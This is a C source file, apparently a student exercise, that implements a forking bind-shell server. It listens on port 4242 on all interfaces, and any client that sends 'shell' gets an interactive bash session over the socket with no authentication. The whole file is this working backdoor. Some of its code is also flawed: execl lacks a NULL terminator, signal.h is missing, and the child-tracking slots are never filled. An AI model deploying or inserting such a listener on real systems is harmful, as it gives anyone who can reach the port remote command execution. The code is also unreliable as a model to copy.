#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>

#include <sys/stat.h>
#include <fcntl.h>

#include <sys/mman.h>

#include <sys/wait.h>

#define MAX 3


static int nb;

typedef struct	s_child{
	int pid;
	int socket;
}				t_child;

t_child *child;

void console(const char *txt)
{
	int fd;
	fd = open("log.txt", O_CREAT | O_APPEND | O_WRONLY, S_IRUSR | S_IWUSR);
	dprintf(fd, " log: %s \n", txt);
	close(fd);
}

int exec_comm_handler( int sck )
{
	close(0);
	close(1);
	close(2);
	if( dup(sck) != 0 || dup(sck) != 1 || dup(sck) != 2 ) {
		perror("error duplicating socket for stdin/stdout/stderr");
		exit(1);
	}
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
	printf("Remote shell ready:\n");
	execl( "/bin/bash", "/bin/bash", "-c", "bash" );
	perror("execl");
	exit(1);
}

void new_child(int sck)
{
	char 	*buf;
	int 	run;
	int		ret;

	run = 1;
	buf = (char *)malloc(100);

	int gotoshell = 0;
	bzero(buf, 100);
	while(run)
	{
		ret = read(sck, (void *)buf, 100);
		if (ret == 0)
		{
			run = 0;
			break;
		}
		if (ret > 0)
		{
			buf[ret - 1] = '\0';
			if (strncmp(buf, "help", 4) == 0) {
				write(sck, "You really need help?\n", 23);
			} else if (strncmp(buf, "shell", 5) == 0) {
				exec_comm_handler(sck);
			} else if (strncmp(buf, "quit", 4) == 0) {
				run = 0;
			}
		}
	}

	close(sck);
	exit(0);
}

void handler(int sig)
{
	pid_t pid;

	pid = wait(NULL);
	for (int i = 0; i < MAX; i++)
	{
		if (child[i].pid == pid)
		{
			child[i].pid = -1;
			write(child[i].socket, "", 0);
			close(child[i].socket);
			child[i].socket = -1;
			printf("free child");
		}
	}
	nb--;
	printf("Pid %d exited. opens: %d \n", pid, nb);
}

int child_slot()
{
	for (int i = 0;i < MAX; i++) {
		if (child[i].pid == -1) {
			printf("Child found %d\n", i);
			return (i);
		}
	}
	return (-1);
}



int main( int argc, char** argv)
{
	nb = 0;
	int sck, client, addrlen;
	struct sockaddr_in this_addr, peer_addr;
	pid_t child_pid = -1;
	unsigned short port = 4242; /* random port to listen on */

	child = (t_child *)mmap(NULL, sizeof(t_child) * MAX, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

	for (int i = 0; i < MAX; i++) {
		child[i].pid = -1;
		child[i].socket = -1;
	}

	signal(SIGCHLD, handler);

	addrlen = sizeof( struct sockaddr_in );
	memset(&this_addr, 0, addrlen );
	memset( &peer_addr, 0, addrlen );
	this_addr.sin_port        = htons(port);
	this_addr.sin_family      = AF_INET;
	this_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	sck = socket( AF_INET, SOCK_STREAM, IPPROTO_IP);
	int	optval = 1;
    setsockopt(sck, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
	bind( sck, (struct sockaddr*)&this_addr, addrlen );
	listen( sck, 5 );
	printf("Remote shell ready connect from nc localhost 4242 \n");
	printf("Really refresh ? \n");

	while( -1 != (client = accept( sck, (struct sockaddr*)&peer_addr, &addrlen ) ) ) {
		child_pid = fork();
		if( child_pid == 0 ) {
			//child[slot].pid = getpid();
			new_child(client);
		}
	}
	exit(1);
	return 0;
}
